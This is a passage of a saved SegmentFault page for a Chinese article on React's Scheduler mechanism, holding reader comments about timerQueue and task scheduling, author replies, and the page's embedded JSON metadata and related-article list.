class="w-100 h-100 position-absolute left-0 top-0 rounded-circle bg-white"></div><div class="ms-3"><h6 class="mb-1 text-break text-body fw-bold">【个人成长】如何搭建前端架构和团队体系</h6><p class="d-flex align-items-center font-size-14 mb-0"><span class="text-secondary">野生程序猿江辰</span><span class="split-dot"></span><span class="text-secondary">赞 <!-- -->50</span><span class="split-dot"></span><span class="text-secondary">阅读 <!-- -->8.3k</span><span class="split-dot"></span><span class="text-secondary">评论 <!-- -->6</span></p></div></a><a href="https://segmentfault.com/a/1190000040534015?utm_source=sf-similar-article" data-rr-ui-event-key="/a/1190000040534015?utm_source=sf-similar-article" class="d-flex align-items-center border-0 list-group-item list-group-item-action"><div class="position-relative sflex-center rounded-circle flex-shrink-0 " style="width:38px;height:38px"><img src="./彻底搞懂React的调度机制原理_files/1049016237-60b9d5bfbe7cf_big64" alt="头像" class="w-100 h-100 position-absolute left-0 top-0 rounded-circle bg-white"></div><div class="ms-3"><h6 class="mb-1 text-break text-body fw-bold">[Jenkins进阶]-前端CI/CD</h6><p class="d-flex align-items-center font-size-14 mb-0"><span class="text-secondary">JenK</span><span class="split-dot"></span><span class="text-secondary">赞 <!-- -->43</span><span class="split-dot"></span><span class="text-secondary">阅读 <!-- -->9.6k</span><span class="split-dot"></span><span class="text-secondary">评论 <!-- -->1</span></p></div></a></div></div><div id="comment-area" class="comment-wrap  card"><div class="d-flex align-items-center justify-content-between bg-transparent border-0 card-header"><strong>9<!-- --> 条评论</strong><div aria-label="Basic" role="group" class="btn-group"><a role="button" tabindex="0" href="https://segmentfault.com/a/1190000039101758?sort=votes" class="btn btn-secondary btn-sm">得票</a><a role="button" tabindex="0" href="https://segmentfault.com/a/1190000039101758?sort=newest" class="btn btn-outline-secondary btn-sm">最新</a></div></div><div class="card-body"><div class="mb-4 media"><div class="position-relative sflex-center rounded-circle flex-shrink-0 me-3" style="width:38px;height:38px" aria-hidden="true"><img src="./彻底搞懂React的调度机制原理_files/3179314346-5f61e47221e07" alt="头像" class="w-100 h-100 position-absolute left-0 top-0 rounded-circle bg-white"></div><div class="media-body"><div class="mb-3"><div class="mentions-wrap dropdown"><textarea rows="3" placeholder="撰写评论 …" aria-label="评论" class="comment-text form-control" style="overflow: hidden; overflow-wrap: break-word; resize: none; height: 86px;"></textarea><div class="invalid-feedback"></div><div class="dropdown-toggle"></div></div></div><div class="d-flex justify-content-end align-items-center"><button type="button" aria-label="提示" class="me-3 btn-reset btn btn-link"><i class="far fa-circle-info text-secondary"></i></button><button type="button" aria-label="提示" class="me-3 btn-reset btn btn-link"><i class="far fa-face-laugh text-secondary"></i></button><button type="button" disabled="" class="float-end btn btn-primary">提交评论</button></div><div role="alert" class="fade mt-3 my-0 font-size-14 alert alert-info show">评论支持部分 Markdown 语法：<code>**粗体** _斜体_ [链接](http://example.com) `代码` - 列表 &gt; 引用</code>。你还可以使用 <code>@ </code>来通知其他用户。</div></div></div><div class="comment-body-wrap false"><div class="mb-r media d-flex align-items-start mb-4"><div class="position-relative sflex-center rounded-circle flex-shrink-0 me-3" style="width: 38px; height: 38px;"><img src="./彻底搞懂React的调度机制原理_files/3179314346-5f61e47221e07" alt="头像" class="w-100 h-100 position-absolute left-0 top-0 rounded-circle bg-white"></div><div class="w-0 media-body "><div class="commentUnit "><div class="mb-1"><a class="d-uname" href="https://segmentfault.com/u/zhouxu_5996b680d61c0" target="_blank"><strong>周旭</strong></a>：<div class="parsedText fmt"><p>👏👏👏 好像是懂了，又好像没懂</p></div></div><div class="handle-bar font-size-14 d-flex justify-content-between"><div class="d-flex align-items-center"><button type="button" aria-label="点赞" class="text-secondary btn-reset btn btn-link"><span class="mainLike-comment "><i class="fa-w-16 far fa-thumbs-up" style="width: 1em;"></i></span></button><span class="split-dot"></span><button type="button" class="text-secondary btn-comment btn-reset btn btn-link">回复</button><span class="split-dot"></span><span class="text-secondary">2021-06-27 </span></div><div class="control-area d-none align-items-center"></div></div></div><div class="replies hidden"><div class="bg-light border-0 mt-2 card"><div class="p-3 card-body"><div class="reply-list list-group"></div></div></div></div></div></div><div class="mb-r media d-flex align-items-start mb-4"><div class="position-relative sflex-center rounded-circle flex-shrink-0 me-3" style="width: 38px; height: 38px;"><img src="./彻底搞懂React的调度机制原理_files/1136548044-5fc496a53aa75_big64" alt="头像" class="w-100 h-100 position-absolute left-0 top-0 rounded-circle bg-white"></div><div class="w-0 media-body "><div class="commentUnit "><div class="mb-1"><a class="d-uname" href="https://segmentfault.com/u/xbjs_1" target="_blank"><strong>xbjs-1</strong></a>：<div class="parsedText fmt"><p>作者太厉害了，你的react源码系列我都追了，收益颇丰👏👏</p></div></div><div class="handle-bar font-size-14 d-flex justify-content-between"><div class="d-flex align-items-center"><button type="button" aria-label="点赞" class="text-secondary btn-reset btn btn-link"><span class="mainLike-comment "><i class="fa-w-16 far fa-thumbs-up" style="width: 1em;"></i></span></button><span class="split-dot"></span><button type="button" class="text-secondary btn-comment btn-reset btn btn-link">回复</button><span class="split-dot"></span><span class="text-secondary">2021-07-06 </span></div><div class="control-area d-none align-items-center"></div></div></div><div class="replies "><div class="bg-light border-0 mt-2 card"><div class="p-3 card-body"><div class="reply-list list-group"><div class="p-0 border-0 commentUnit false   list-group-item"><div class="font-size-14 mb-1"><a class="d-uname" href="https://segmentfault.com/u/neronero" target="_blank"><strong>nero</strong><span class="text-secondary">（作者）</span></a>：<div class="parsedText fmt"><p><a href="https://segmentfault.com/u/xbjs_1">@xbjs-1</a> 感谢支持哈~</p></div></div><div class="handle-bar font-size-14 d-flex justify-content-between"><div><button type="button" aria-label="点赞" class="text-secondary btn-reset btn btn-link"><span class="mainLike-comment "><i class="fa-w-16 far fa-thumbs-up" style="width: 1em;"></i></span></button><span class="split-dot"></span><button type="button" class="text-secondary btn-reply btn-reset btn btn-link">回复</button><span class="split-dot"></span><span class="text-secondary">2021-07-27 </span></div><div class="comment-control-area d-none"></div></div></div></div></div></div></div></div></div><div class="mb-r media d-flex align-items-start mb-4"><div class="position-relative sflex-center rounded-circle flex-shrink-0 me-3" style="width: 38px; height: 38px;"><img src="./彻底搞懂React的调度机制原理_files/3179314346-5f61e47221e07" alt="头像" class="w-100 h-100 position-absolute left-0 top-0 rounded-circle bg-white"></div><div class="w-0 media-body "><div class="commentUnit "><div class="mb-1"><a class="d-uname" href="https://segmentfault.com/u/jakerluo" target="_blank"><strong>jakerluo</strong></a>：<div class="parsedText fmt"><p>请问timerQueue 是在什么情况下会被使用到呢， 能不能具体说个场景呢</p></div></div><div class="handle-bar font-size-14 d-flex justify-content-between"><div class="d-flex align-items-center"><button type="button" aria-label="点赞" class="text-secondary btn-reset btn btn-link"><span class="mainLike-comment "><i class="fa-w-16 far fa-thumbs-up" style="width: 1em;"></i></span></button><span class="split-dot"></span><button type="button" class="text-secondary btn-comment btn-reset btn btn-link">回复</button><span class="split-dot"></span><span class="text-secondary">2021-07-26 </span></div><div class="control-area d-none align-items-center"></div></div></div><div class="replies "><div class="bg-light border-0 mt-2 card"><div class="p-3 card-body"><div class="reply-list list-group"><div class="p-0 border-0 commentUnit mb-3   list-group-item"><div class="font-size-14 mb-1"><a class="d-uname" href="https://segmentfault.com/u/neronero" target="_blank"><strong>nero</strong><span class="text-secondary">（作者）</span></a>：<div class="parsedText fmt"><p><a href="https://segmentfault.com/u/jakerluo">@jakerluo</a> 您可以把timerQueue看作是taskQueue的任务仓库，例如A 和B都是存在于timerQueue中的任务，如果当前时间已经等于或者大于A的开始时间，说明A过期了，那A就会被advanceTimers（/scheduler/src/Scheduler.js文件中）函数从timerQueue转移到taskQueue，成为过期任务，从而被执行掉。任务被放到具体场景的情况下是在ensureRootIsScheduled函数（react-reconciler\src\ReactFiberWorkLoop.old.js文件中）中调用scheduler提供的调度入口函数scheduleCallback时，主动传第三个参数，比如 { deley: 5 }，主动去推迟任务，这样这个任务才会被放到timerQueue中</p></div></div><div class="handle-bar font-size-14 d-flex justify-content-between"><div><button type="button" aria-label="点赞" class="text-secondary btn-reset btn btn-link"><span class="mainLike-comment "><i class="fa-w-16 far fa-thumbs-up" style="width: 1em;"></i></span></button><span class="split-dot"></span><button type="button" class="text-secondary btn-reply btn-reset btn btn-link">回复</button><span class="split-dot"></span><span class="text-secondary">2021-07-27 </span></div><div class="comment-control-area d-none"></div></div></div><div class="p-0 border-0 commentUnit mb-3   list-group-item"><div class="font-size-14 mb-1"><a class="d-uname" href="https://segmentfault.com/u/jakerluo" target="_blank"><strong>jakerluo</strong></a>：<div class="parsedText fmt"><p><a href="https://segmentfault.com/u/neronero">@nero</a> 我在你说的文件里面，并没有找到主动传第三个参数的地方呀</p></div></div><div class="handle-bar font-size-14 d-flex justify-content-between"><div><button type="button" aria-label="点赞" class="text-secondary btn-reset btn btn-link"><span class="mainLike-comment "><i class="fa-w-16 far fa-thumbs-up" style="width: 1em;"></i></span></button><span class="split-dot"></span><button type="button" class="text-secondary btn-reply btn-reset btn btn-link">回复</button><span class="split-dot"></span><span class="text-secondary">2021-07-27 </span></div><div class="comment-control-area d-none"></div></div></div><div class="p-0 border-0 commentUnit false   list-group-item"><div class="font-size-14 mb-1"><a class="d-uname" href="https://segmentfault.com/u/neronero" target="_blank"><strong>nero</strong><span class="text-secondary">（作者）</span></a>：<div class="parsedText fmt"><p><a href="https://segmentfault.com/u/jakerluo">@jakerluo</a> 嗯，目前看没有什么主动去将任务放到timerQueue的场景，如果有的话也是低优先级任务</p></div></div><div class="handle-bar font-size-14 d-flex justify-content-between"><div><button type="button" aria-label="点赞" class="text-secondary btn-reset btn btn-link"><span class="mainLike-comment "><i class="fa-w-16 far fa-thumbs-up" style="width: 1em;"></i></span></button><span class="split-dot"></span><button type="button" class="text-secondary btn-reply btn-reset btn btn-link">回复</button><span class="split-dot"></span><span class="text-secondary">2021-07-27 </span></div><div class="comment-control-area d-none"></div></div></div></div></div></div></div></div></div><div class="mb-r media d-flex align-items-start mb-4"><div class="position-relative sflex-center rounded-circle flex-shrink-0 me-3" style="width: 38px; height: 38px;"><img src="./彻底搞懂React的调度机制原理_files/3179314346-5f61e47221e07" alt="头像" class="w-100 h-100 position-absolute left-0 top-0 rounded-circle bg-white"></div><div class="w-0 media-body "><div class="commentUnit "><div class="mb-1"><a class="d-uname" href="https://segmentfault.com/u/yang_w0223" target="_blank"><strong>yang</strong></a>：<div class="parsedText fmt"><p>写的太好了, 感谢分享!!!</p></div></div><div class="handle-bar font-size-14 d-flex justify-content-between"><div class="d-flex align-items-center"><button type="button" aria-label="点赞" class="text-secondary btn-reset btn btn-link"><span class="mainLike-comment "><i class="fa-w-16 far fa-thumbs-up" style="width: 1em;"></i></span></button><span class="split-dot"></span><button type="button" class="text-secondary btn-comment btn-reset btn btn-link">回复</button><span class="split-dot"></span><span class="text-secondary">2021-08-28 </span></div><div class="control-area d-none align-items-center"></div></div></div><div class="replies hidden"><div class="bg-light border-0 mt-2 card"><div class="p-3 card-body"><div class="reply-list list-group"></div></div></div></div></div></div><div class="mb-r media d-flex align-items-start false"><div class="position-relative sflex-center rounded-circle flex-shrink-0 me-3" style="width: 38px; height: 38px;"><img src="./彻底搞懂React的调度机制原理_files/3179314346-5f61e47221e07" alt="头像" class="w-100 h-100 position-absolute left-0 top-0 rounded-circle bg-white"></div><div class="w-0 media-body "><div class="commentUnit "><div class="mb-1"><a class="d-uname" href="https://segmentfault.com/u/yuartian" target="_blank"><strong>yuartian</strong></a>：<div class="parsedText fmt"><p>如果拖动的事件用react的事件的话，那么渲染任务是不是就会被取消啊？</p></div></div><div class="handle-bar font-size-14 d-flex justify-content-between"><div class="d-flex align-items-center"><button type="button" aria-label="点赞" class="text-secondary btn-reset btn btn-link"><span class="mainLike-comment "><i class="fa-w-16 far fa-thumbs-up" style="width: 1em;"></i></span></button><span class="split-dot"></span><button type="button" class="text-secondary btn-comment btn-reset btn btn-link">回复</button><span class="split-dot"></span><span class="text-secondary">2022-07-28 </span><span class="split-dot"></span><span class="text-secondary">来自上海</span></div><div class="control-area d-none align-items-center"></div></div></div><div class="replies hidden"><div class="bg-light border-0 mt-2 card"><div class="p-3 card-body"><div class="reply-list list-group"></div></div></div></div></div></div></div></div></div></div></div></div><footer class="d-none d-sm-block bg-white py-5 border-top"><div class="text-center text-secondary mb-1">©2023 <!-- -->React的秘密</div><div class="text-center text-secondary font-size-14">除特别声明外，<a target="_blank" class="text-secondary" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">作品采用《署名-非商业性使用-禁止演绎 4.0 国际》进行许可</a></div><div class="d-flex justify-content-center my-4"><a role="button" tabindex="0" href="https://segmentfault.com/blogs" class="d-flex align-items-center rounded btn btn-light"><svg width="16" height="16" viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg" class="me-2 text-primary"><title>SF</title><path fill-rule="evenodd" clip-rule="evenodd" d="M8 0C3.58172 0 0 3.58172 0 8V20C0 24.4183 3.58172 28 8 28H20C24.4183 28 28 24.4183 28 20V8C28 3.58172 24.4183 0 20 0H8ZM13.73 11.9372C12.578 11.2873 11.2724 10.9592 9.95 10.9872C8.625 10.9872 5.535 11.3372 5.535 14.5872C5.535 16.4122 6.495 17.2622 7.935 17.9772C8.305 18.1622 8.655 18.3072 8.965 18.4322L8.96675 18.433C9.83592 18.7926 10.525 19.0778 10.525 19.8472C10.525 20.7222 9.715 21.0322 8.96 21.0322C7.93318 20.9427 6.96552 20.5134 6.21 19.8122L5.25 21.7322V21.9572C6.47366 22.8581 7.96081 23.3292 9.48 23.2972C11.175 23.2972 14.015 22.8422 14.015 19.6272C14.015 17.6272 13.065 16.8572 11.315 16.1272L10.67 15.8772C9.725 15.5222 8.98 15.2422 8.98 14.4522C8.98 13.9672 9.22 13.3872 10.38 13.3872C11.2483 13.3883 12.0951 13.6572 12.805 14.1572L13.73 12.1572V11.9372ZM22.92 5.75224C22.0842 5.39862 21.1823 5.22813 20.275 5.25224C18.635 5.25224 16.635 5.92724 16.635 9.14724C16.635 9.16319 16.6454 9.5817 16.6567 10.0374C16.6702 10.5821 16.685 11.18 16.685 11.2072C16.6839 11.2467 16.6678 11.2842 16.64 11.3122C16.611 11.3378 16.5737 11.352 16.535 11.3522H15.36L15.32 13.8922C15.4316 13.8922 15.5761 13.8878 15.7433 13.8827C15.973 13.8756 16.2456 13.8672 16.535 13.8672L16.5911 13.8777L16.64 13.9072C16.667 13.9358 16.683 13.973 16.685 14.0122C16.665 14.8782 16.653 16.325 16.6458 17.8134L16.642 18.7072C16.6393 19.4489 16.6377 20.1741 16.6366 20.8153L16.6357 21.5401L16.6354 21.8642L16.635 22.9722L20.2 22.9522C20.1997 22.8821 20.1992 22.7899 20.1987 22.6781C20.1954 21.9732 20.1884 20.4931 20.1781 18.9054L20.1684 17.515C20.1579 16.13 20.145 14.8097 20.13 13.9922C20.1281 13.9532 20.1426 13.9151 20.17 13.8872C20.199 13.8617 20.2363 13.8474 20.275 13.8472L20.5421 13.8565C20.9195 13.867 21.368 13.8705 21.7216 13.8717L22.16 13.8722L22.2 11.3322H20.275L20.2189 11.3218L20.17 11.2922C20.1436 11.2637 20.1292 11.2261 20.13 11.1872V9.62724C20.13 8.35724 20.46 7.81724 21.225 7.81724C21.5758 7.8304 21.9184 7.92634 22.225 8.09724L22.92 6.02724V5.75224Z" fill="currentColor"></path></svg>使用 SegmentFault 发布</a></div><div class="text-center mb-1 font-size-14"><a href="https://segmentfault.com/">SegmentFault - 凝聚集体智慧，推动技术进步</a></div><div class="text-center font-size-14"><a href="https://segmentfault.com/tos?utm_source=sf-footer" class="text-secondary">服务协议</a><span class="split-dot"></span><a href="https://segmentfault.com/privacy?utm_source=sf-footer" class="text-secondary">隐私政策</a><span class="split-dot"></span><a href="http://beian.miit.gov.cn/" target="_blank" class="text-secondary">浙ICP备15005796号-2</a><span class="split-dot"></span><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=33010602002000" target="_blank" class="text-secondary">浙公网安备33010602002000号</a></div></footer></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"initialState":"{\"global\":{\"sessionUser\":null,\"isHiddenHeader\":false,\"isHiddenFooter\":false,\"title\":\"javascript - 一篇长文帮你彻底搞懂React的调度机制原理 - React的秘密 - SegmentFault 思否\",\"titleAlias\":\"一篇长文帮你彻底搞懂React的调度机制原理 - SegmentFault 思否\",\"isShowLogin\":false,\"beginnerGuideState\":{\"visible\":false,\"type\":1},\"isShowBindMobile\":false,\"authChannel\":\"\",\"unactivated\":false,\"isShowRegister\":false,\"headOptions\":{\"keywords\":\"javascript,前端,react.js\",\"description\":\"Scheduler作为一个独立的包，可以独自承担起任务调度的职责，你只需要将任务和任务的优先级交给它，它就可以帮你管理任务，安排任务的执行。这就是React和Sch...\"},\"sessionInfo\":{\"key\":\"0dcb67edf3772bcfd7f45dbe548b5d82\",\"login\":false,\"id\":null},\"singleNotice\":\"\",\"currentRoute\":{\"noLayout\":false,\"customLayout\":false,\"headerType\":\"blog\",\"platform\":\"\",\"action\":\"\",\"param\":\"\"},\"letterNum\":0,\"noticeNum\":0,\"serverData\":{\"Token\":\"0dcb67edf3772bcfd7f45dbe548b5d82\",\"userAgent\":\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36\",\"platform\":\"\"},\"userStat\":{},\"newTask\":{},\"followedTags\":[],\"globalCss\":\"\",\"baiduOxAppState\":{\"isShow\":false,\"copyUrl\":\"\"},\"pageUsers\":{},\"wxShareCover\":\"\",\"isBaiduOxApp\":false,\"showProductAuthModal\":{\"isShow\":false,\"title\":\"\"},\"routeInterceptor\":{\"path\":\"\"},\"safeCheckModal\":{\"isShow\":false,\"pageSource\":\"\"},\"followSFState\":{\"isShow\":false},\"messageNotice\":{\"event\":{\"general\":0,\"ranked\":0,\"followed\":0,\"inbox\":0,\"comment\":0,\"marketing\":0},\"message\":0,\"badge\":0},\"badgeModalState\":{}},\"articleDetail\":{\"artDetail\":{\"1190000039101758\":{\"title\":\"javascript - 一篇长文帮你彻底搞懂React的调度机制原理 - React的秘密\",\"keywords\":\"javascript,前端,react.js\",\"description\":\"Scheduler作为一个独立的包，可以独自承担起任务调度的职责，你只需要将任务和任务的优先级交给它，它就可以帮你管理任务，安排任务的执行。这就是React和Sch...\",\"article\":{\"id\":1190000039101758,\"title\":\"一篇长文帮你彻底搞懂React的调度机制原理\",\"cover\":null,\"tags_list\":\"1040000000089436,1040000000089899,1040000002893277\",\"user_id\":1030000010016428,\"blog_id\":1200000038625990,\"excerpt\":\"Scheduler作为一个独立的包，可以独自承担起任务调度的职责，你只需要将任务和任务的优先级交给它，它就可以帮你管理任务，安排任务的执行。这就是React和Sch...\",\"parsed_text\":\"\",\"is_bookmarked\":false,\"is_liked\":false,\"created\":1611724267,\"modified\":1614335390,\"real_views\":12145,\"real_unique_views\":9240,\"votes\":55,\"bookmarks\":22,\"status\":2,\"read_time\":21,\"is_sticky\":false,\"origin_url\":\"\",\"article_type\":1,\"license\":\"1\",\"langs\":[],\"comments\":9,\"is_edited\":true,\"ip_address\":null,\"tags\":[{\"id\":1040000002893277,\"url\":\"/t/react.js\",\"name\":\"react.js\",\"icon_url\":\"\"},{\"id\":1040000000089436,\"url\":\"/t/javascript\",\"name\":\"javascript\",\"icon_url\":\"\"},{\"id\":1040000000089899,\"url\":\"/t/%E5%89%8D%E7%AB%AF\",\"name\":\"前端\",\"icon_url\":\"\"}],\"user\":{\"id\":1030000010016428,\"name\":\"nero\",\"avatar_url\":\"https://avatar-static.segmentfault.com/412/504/4125048880-5d76f84e47ad4_huge128\",\"url\":\"/u/neronero\",\"rank\":4297,\"rank_word\":\"4.3k\",\"is_followed\":false,\"excerpt\":\"\u003cp\u003e前端工程师\u003c/p\u003e\",\"followers\":6339,\"articles\":38,\"bindings_list\":[{\"type\":\"github\",\"url\":\"https://github.com/neroneroffy\",\"is_bind\":1}],\"user_auth\":null,\"headdress_worn\":null,\"summary_badges\":{\"gold\":19,\"silver\":80,\"bronze\":105},\"rank_level\":{\"title\":\"专家\",\"rank\":4297,\"next_level_rank\":703,\"target_rank\":5000,\"tips\":\"距离下一里程碑还需 703 声望值\"}},\"status_key\":\"recommend\"},\"blog\":{\"id\":1200000038625990,\"name\":\"React的秘密\",\"url\":\"/blog/react-secret\",\"thumbnail_url\":null,\"is_followed\":false,\"excerpt\":\"最平实的语言，解读复杂React\",\"followers\":4307,\"articles\":17,\"license\":\"cc\",\"user_id\":1030000010016428,\"admins_user\":[{\"id\":1030000010016428,\"name\":\"nero\",\"avatar_url\":\"https://avatar-static.segmentfault.com/412/504/4125048880-5d76f84e47ad4_big64\",\"url\":\"/u/neronero\",\"is_master\":1}],\"personalization\":{\"layout\":\"default\",\"header_color\":\"\",\"is_show_view\":1}},\"actions\":[],\"member_actions\":[],\"article_types\":{\"1\":\"原创\",\"2\":\"转载\",\"3\":\"翻译\"},\"pay_info\":null,\"extra\":{\"reason\":null,\"operator\":null,\"operator_time\":null},\"tag\":{\"name\":\"javascript\",\"url\":\"/t/javascript\",\"icon_url\":\"\"},\"site\":null,\"prev_article\":{\"id\":1190000039097269,\"url\":\"/a/1190000039097269\",\"title\":\"React源码  commit阶段详解\"},\"next_article\":{\"id\":1190000039108951,\"url\":\"/a/1190000039108951\",\"title\":\"深入React合成事件机制原理\"},\"isServerLoaded\":true}},\"alertMsg\":{\"showAlert\":false,\"msg\":\"\"},\"articleRelated\":[{\"id\":1190000022606323,\"url\":\"/a/1190000022606323\",\"cover\":null,\"title\":\"彻底搞懂React源码调度原理（Concurrent模式）\",\"views\":5800,\"real_unique_views\":5233,\"comments\":2,\"votes\":24,\"excerpt\":\"自上一篇写关于diff的文章到现在已经过了二十天多，利用业余时间和10天婚假的闲暇，终于搞懂了React源码中的调度原理。当费劲一番周折终于调试到将更新与调度任务连接在一起的核心逻辑那一刻，忧愁的嘴角终于露出...\",\"user\":{\"name\":\"苏溪云\",\"url\":\"/u/terry_su\",\"avatar_url\":\"https://avatar-static.segmentfault.com/187/133/1871337460-5b4ee9985d2de_big64\",\"headdress_worn\":null}},{\"id\":1190000022648417,\"url\":\"/a/1190000022648417\",\"cover\":null,\"title\":\"第19期 彻底搞懂React源码调度原理（Concurrent模式）\u0026 HTTP/3原理与实践\",\"views\":1177,\"real_unique_views\":1128,\"comments\":0,\"votes\":0,\"excerpt\":\"2015 年 HTTP/2 标准发表后，大多数主流浏览器也于当年年底支持该标准。此后，凭借着多路复用、头部压缩、服务器推送等优势，HTTP/2 得到了越来越多开发者的青睐。不知不觉的 HTTP 已经发展到了第三代，鹅厂也紧...\",\"user\":{\"name\":\"前端收藏家\",\"url\":\"/u/llllll_5dd09b5e4bc57\",\"avatar_url\":\"https://avatar-static.segmentfault.com/291/357/2913576562-5ead7b76a92f1_big64\",\"headdress_worn\":null}},{\"id\":1190000041184562,\"url\":\"/a/1190000041184562\",\"cover\":\"/img/bVcWX9h?spec=cover\",\"title\":\"不用一行代码，搞懂React调度器原理\",\"views\":3048,\"real_unique_views\":2705,\"comments\":1,\"votes\":7,\"excerpt\":\"大家好，我卡颂。Scheduler(调度器)是React重要的组成部分。同时，他也是个独立的包，任何连续、可中断的流程都可以用Scheduler来调度，比如： {代码...} work满足两个条件：工作是连续的。一共需要执行100次，每...\",\"user\":{\"name\":\"卡颂\",\"url\":\"/u/kasong\",\"avatar_url\":\"https://avatar-static.segmentfault.com/156/263/1562634614-5f87a2ec6b485_big64\",\"headdress_worn\":null}},{\"id\":1190000022311760,\"url\":\"/a/1190000022311760\",\"cover\":null,\"title\":\"搞懂React源码系列-React Diff原理\",\"views\":3287,\"real_unique_views\":3064,\"comments\":0,\"votes\":13,\"excerpt\":\"时隔2年，重新看React源码，很多以前不理解的内容现在都懂了。本文将用实际案例结合相关React源码，集中讨论React Diff原理。使用当前最新React版本：16.13.1。\",\"user\":{\"name\":\"苏溪云\",\"url\":\"/u/terry_su\",\"avatar_url\":\"https://avatar-static.segmentfault.com/187/133/1871337460-5b4ee9985d2de_big64\",\"headdress_worn\":null}},{\"id\":1190000039869097,\"url\":\"/a/1190000039869097\",\"cover\":\"/img/bVcRrYn?spec=cover\",\"title\":\"前端内练基础-彻底搞懂浏览器的Event-loop\",\"views\":1448,\"real_unique_views\":1340,\"comments\":0,\"votes\":0,\"excerpt\":\"Event loop 是一个很重要的概念，本质上指的是计算机的运行机制，JavaScript语言采用的就是这种机制，众所周知JavaScript是单线程，为什么会设计成单线程呢？其实早在几年前阮一峰老师就给出了答案，这样的好处提...\",\"user\":{\"name\":\"THIS\",\"url\":\"/u/this_586daa4645804\",\"avatar_url\":\"https://avatar-static.segmentfault.com/214/983/2149838410-586dacba3d853_big64\",\"headdress_worn\":null}}],\"quotedData\":{\"rows\":[{\"id\":1930000042159754,\"object_id\":1190000039149258,\"from_object_id\":1190000039101758,\"type_str\":\"article\",\"object\":{\"id\":1190000039149258,\"title\":\"React中的任务饥饿行为\",\"url\":\"/a/1190000039149258\",\"user\":{\"id\":1030000010016428,\"url\":\"/u/neronero\",\"name\":\"nero\",\"avatar_url\":\"https://avatar-static.segmentfault.com/412/504/4125048880-5d76f84e47ad4_big64\",\"headdress_worn\":null},\"comments\":3},\"actions\":[]}],\"page\":1,\"size\":5,\"total_page\":1,\"total\":1},\"articleRecommendationList\":[{\"id\":1190000039149258,\"url\":\"/a/1190000039149258\",\"cover\":null,\"title\":\"React中的任务饥饿行为\",\"views\":4534,\"real_unique_views\":3970,\"comments\":3,\"votes\":7,\"excerpt\":\"饥饿问题说到底就是高优先级任务不能毫无底线地打断低优先级任务，一旦低优先级任务过期了，那么他就会被提升到同步优先级去立即执行。如下面的例子：我点击左面的开始按钮，开始渲染大量DOM节点，完成一次正常的...\",\"user\":{\"name\":\"nero\",\"url\":\"/u/neronero\",\"avatar_url\":\"https://avatar-static.segmentfault.com/412/504/4125048880-5d76f84e47ad4_big64\",\"headdress_worn\":null}},{\"id\":1190000011557368,\"url\":\"/a/1190000011557368\",\"cover\":null,\"title\":\"JavaScript有用的代码片段和trick\",\"views\":10663,\"real_unique_views\":10285,\"comments\":12,\"votes\":70,\"excerpt\":\"平时工作过程中可以用到的实用代码集棉。判断对象否为空 {代码...} 浮点数取整 {代码...} 注意：前三种方法只适用于32个位整数，对于负数的处理上和Math.floor是不同的。 {代码...} 生成6位数字验证码 {代码...} ...\",\"user\":{\"name\":\"jenemy\",\"url\":\"/u/jenemy\",\"avatar_url\":\"https://avatar-static.segmentfault.com/383/114/3831149293-59b53044f035f_big64\",\"headdress_worn\":null}},{\"id\":1190000009898072,\"url\":\"/a/1190000009898072\",\"cover\":null,\"title\":\"移动端开发的兼容问题\",\"views\":11597,\"real_unique_views\":11270,\"comments\":10,\"votes\":46,\"excerpt\":\"移动端开发的兼容问题文章已同步我的github笔记[链接]，欢迎大家加star~~，加star后人生更加美好……1、ios下input为type=button属性disabled设置true,会出现样式文字和背景异常问题。解决方案:使用opacity=1来解决...\",\"user\":{\"name\":\"余木\",\"url\":\"/u/ymup\",\"avatar_url\":\"https://avatar-static.segmentfault.com/176/521/1765210744-5b52d4ef09f06_big64\",\"headdress_worn\":null}},{\"id\":1190000041572883,\"url\":\"/a/1190000041572883\",\"cover\":\"/img/bVc9PM2?spec=cover\",\"title\":\"【个人成长】专科如何进入大厂\",\"views\":11616,\"real_unique_views\":9482,\"comments\":12,\"votes\":79,\"excerpt\":\"大概在去年11月份的时候，我负责的业务线一直做不出成绩。而且整个公司的前端技术设施，都是我一手搭建出来的，再待在公司，没什么可成长的空间，就想跳槽了，期间考虑了几个可能性：\",\"user\":{\"name\":\"野生程序猿江辰\",\"url\":\"/u/thomas_5b0e5d1b64584\",\"avatar_url\":\"https://avatar-static.segmentfault.com/429/133/4291332973-64f000fae9a4d_big64\",\"headdress_worn\":null}},{\"id\":1190000020604384,\"url\":\"/a/1190000020604384\",\"cover\":null,\"title\":\"如何编写高质量的 JS 函数（3） --函数式编程[理论篇]\",\"views\":6895,\"real_unique_views\":6747,\"comments\":2,\"votes\":49,\"excerpt\":\"本文首发于 vivo互联网技术 微信公众号  链接：[链接] 作者：杨昆 【编写高质量函数系列】中，《如何编写高质量的 JS 函数（1） -- 敲山震虎篇》介绍了函数的执行机制，此篇将会从函数的命名、注释和鲁棒性方面，...\",\"user\":{\"name\":\"vivo互联网技术\",\"url\":\"/u/vivo_tech\",\"avatar_url\":\"https://avatar-static.segmentfault.com/279/029/2790295347-5c7f8d6242978_big64\",\"headdress_worn\":null}},{\"id\":1190000039955253,\"url\":\"/a/1190000039955253\",\"cover\":\"/img/bVcRTqI?spec=cover\",\"title\":\"【个人成长】如何搭建前端架构和团队体系\",\"views\":8276,\"real_unique_views\":6880,\"comments\":6,\"votes\":50,\"excerpt\":\"自我介绍下，四年工作经验，头两年全栈开发，后两年专职做前端，目前已达到高级前端工程师水平，经历过三家公司。第一家公司，电商行业，做阿里 ISV 供应商，为淘宝卖家服务，也是我第一次接触百万 UV 级别的产品...\",\"user\":{\"name\":\"野生程序猿江辰\",\"url\":\"/u/thomas_5b0e5d1b64584\",\"avatar_url\":\"https://avatar-static.segmentfault.com/429/133/4291332973-64f000fae9a4d_big64\",\"headdress_worn\":null}},{\"id\":1190000040534015,\"url\":\"/a/1190000040534015\",\"cover\":\"/img/bVc9Gg6?spec=cover\",\"title\":\"[Jenkins进阶]-前端CI/CD\",\"views\":9624,\"real_unique_views\":7673,\"comments\":1,\"votes\":43,\"excerpt\":\"如果没有自动化， 我们的前端从开发到提测工作流程可能如下：1.本地机器上写代码2.在命令行输入 npm run unit/lint，查看单元测试/eslint校验结果3.提交代码，push 到 git 远程仓库4.执行 npm run 